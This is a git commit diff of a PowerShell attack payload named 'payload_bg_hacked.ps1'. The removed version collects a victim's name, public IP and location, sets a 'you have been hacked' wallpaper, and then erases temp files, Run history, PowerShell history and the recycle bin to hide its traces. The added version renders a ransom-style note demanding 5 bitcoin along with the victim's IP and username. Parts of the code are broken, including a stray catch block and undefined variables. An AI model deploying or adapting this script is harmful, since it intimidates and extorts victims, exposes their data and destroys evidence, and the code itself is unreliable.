d9caf04043db499ba335c220754f6ab62f322010
Poplel <116518184+Poplel@users.noreply.github.com>
2025-05-09 12:04:26 -0500

    Update payload_bg_hacked.ps1
    Updated script

--- payload_bg_hacked.ps1
+++ payload_bg_hacked.ps1
@@ -1,280 +1,76 @@
-<#
-
-.NOTES  
-	This will get the name associated with the microsoft account
-#>
-
- function Get-Name {
-
+# Function to get the public IP address
+function Get-PublicIP {
     try {
-
-    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
-
+        (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content.Trim()
     }
- 
- # If no name is detected function will return $null to avoid sapi speak
-
-    # Write Error is just for troubleshooting 
-    catch {Write-Error "No name was detected" 
-    return $env:UserName
-    -ErrorAction SilentlyContinue
+    catch {
+        Write-Warning "Could not retrieve public IP address."
+        return ""
     }
-
-    return $fullName
-
 }
 
-$fn = Get-Name
+# Get the public IP address
+$PublicIP = Get-PublicIP
 
-echo "Hey" $fn >> $Env:temp\foo.txt
+# Get the current username
+$Username = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
 
-echo "`nYour has been hacked" >> $Env:temp\foo.txt
-
-#############################################################################################################################################
-
-<#
-
-.NOTES 
-	This is to get the current Latitide and Longitude of your target
-#>
-
-function Get-GeoLocation{
-	try {
-	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
-	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
-
-	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
-	}  
-
-	if ($GeoWatcher.Permission -eq 'Denied'){
-		Write-Error 'Access Denied for Location Information'
-	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
-		
-	}
-	}
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No coordinates found" 
-    return "No Coordinates found"
-    -ErrorAction SilentlyContinue
-    } 
-
-}
-
-#$GL = Get-GeoLocation
-#if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
-
-
-#############################################################################################################################################
-
-<#
-
-.NOTES  
-	This will get the public IP from the target computer
-#>
-
-
-function Get-PubIP {
-
-    try {
-
-    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-
-    }
- 
- # If no Public IP is detected function will return $null to avoid sapi speak
-
-    # Write Error is just for troubleshooting 
-    catch {Write-Error "No Public IP was detected" 
-    return $null
-    -ErrorAction SilentlyContinue
-    }
-
-    return $computerPubIP
-}
-
-$PubIP = Get-PubIP
-if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
-
-
-###########################################################################################################
-
-<#
-
-.NOTES 
-	Password last Set
-	This function will custom tailor a response based on how long it has been since they last changed their password
-#>
-
-$content = [IO.File]::ReadAllText("$Env:temp\foo.txt")
-	}
-#############################################################################################################################################
-
-<#
-
-.NOTES 
-	This will get the dimension of the targets screen to make the wallpaper
-#>
-
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class PInvoke {
-    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
-    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
-}
+# Format the text
+$TextContent = @"
+Your have been hacked
+##################################
+IP Address: $PublicIP
+##################################
+User: $Username
+##################################
+Your comouter is not safe please pay 5 bitcoin to me or i will delete
 "@
-$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
-$w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
-$h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
 
-#############################################################################################################################################
+# Define the output text file path
+$TextFilePath = "$env:TEMP\fake_hack.txt"
 
-<#
+# Save the text to a file
+$TextContent | Out-File -Path $TextFilePath -Encoding UTF8
 
-.NOTES  
-	This will get take the information gathered and format it into a .jpg
-#>
+# Get screen resolution
+$ScreenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
+$ScreenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
 
-Add-Type -AssemblyName System.Drawing
+# Define the output JPG file path
+$ImagePath = "$env:TEMP\fake_hack.jpg"
 
-$filename = "$env:tmp\foo.jpg" 
-$bmp = new-object System.Drawing.Bitmap $w,$h 
-$font = new-object System.Drawing.Font Consolas,18 
-$brushBg = [System.Drawing.Brushes]::Black
-$brushFg = [System.Drawing.Brushes]::White 
-$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
-$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
-$graphics.DrawString($content,$font,$brushFg,500,100) 
-$graphics.Dispose() 
-$bmp.Save($filename) 
+# Install-Module -Name System.Drawing.Common -Force # Uncomment and run once if you don't have this module
 
-# Invoke-Item $filename 
+# Create a drawing surface
+Add-Type -AssemblyName System.Drawing.Common
+$Bitmap = New-Object System.Drawing.Bitmap($ScreenWidth, $ScreenHeight)
+$Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
 
-#############################################################################################################################################
+# Set background color (optional)
+$BackgroundColor = [System.Drawing.SolidBrush]::White
+$Graphics.FillRectangle($BackgroundColor, 0, 0, $ScreenWidth, $ScreenHeight)
 
-<#
+# Define font and brush for text
+$Font = New-Object System.Drawing.Font("Arial", 24)
+$Brush = New-Object System.Drawing.SolidBrush("Black")
 
-.NOTES 
-	This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
-	Then it will clean up the files you don't want to leave behind
-#>
+# Define starting Y-coordinate for text
+$Y = 50
 
-echo $hiddenMessage > $Env:temp\foo.txt
-cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
-
-rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
-
-
-#############################################################################################################################################
-
-<#
-
-.NOTES 
-	This will take the image you generated and set it as the targets wall paper
-#>
-
-Function Set-WallPaper {
- 
-<#
- 
-    .SYNOPSIS
-    Applies a specified wallpaper to the current user's desktop
-    
-    .PARAMETER Image
-    Provide the exact path to the image
- 
-    .PARAMETER Style
-    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
-  
-    .EXAMPLE
-    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
-    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
-  
-#>
-
- 
-param (
-    [parameter(Mandatory=$True)]
-    # Provide path to image
-    [string]$Image,
-    # Provide wallpaper style that you would like applied
-    [parameter(Mandatory=$False)]
-    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
-    [string]$Style
-)
- 
-$WallpaperStyle = Switch ($Style) {
-  
-    "Fill" {"10"}
-    "Fit" {"6"}
-    "Stretch" {"2"}
-    "Tile" {"0"}
-    "Center" {"0"}
-    "Span" {"22"}
-  
-}
- 
-If($Style -eq "Tile") {
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
- 
-}
-Else {
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
- 
-}
- 
-Add-Type -TypeDefinition @" 
-using System; 
-using System.Runtime.InteropServices;
-  
-public class Params
-{ 
-    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
-    public static extern int SystemParametersInfo (Int32 uAction, 
-                                                   Int32 uParam, 
-                                                   String lpvParam, 
-                                                   Int32 fuWinIni);
-}
-"@ 
-  
-    $SPI_SETDESKWALLPAPER = 0x0014
-    $UpdateIniFile = 0x01
-    $SendChangeEvent = 0x02
-  
-    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
-  
-    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+# Loop through each line of the text and draw it
+foreach ($Line in $TextContent.Split("`n")) {
+    $Graphics.DrawString($Line, $Font, $Brush, 50, $Y)
+    $Y += $Font.GetHeight($Graphics) + 10 # Adjust spacing
 }
 
-#----------------------------------------------------------------------------------------------------
+# Save the bitmap as a JPG
+$Bitmap.Save($ImagePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
 
-function clean-exfil {
-  #del tempo
-  rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-  #del runbox
-  reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-  #del powersh history
-  Remove-Item (Get-PSreadlineOption).HistorySavePath
-  #clear bin
-  Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-	}
+# Clean up resources
+$Font.Dispose()
+$Brush.Dispose()
+$Graphics.Dispose()
+$Bitmap.Dispose()
 
-
-	catch {Write-Error "Can not do clean exfil" 
-	return $env:UserName
-	-ErrorAction SilentlyContinue
-	}
-}
-#----------------------------------------------------------------------------------------------------
- 
-Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
-
-clean-exfil
- 
+# Display the image
+Start-Process $ImagePath
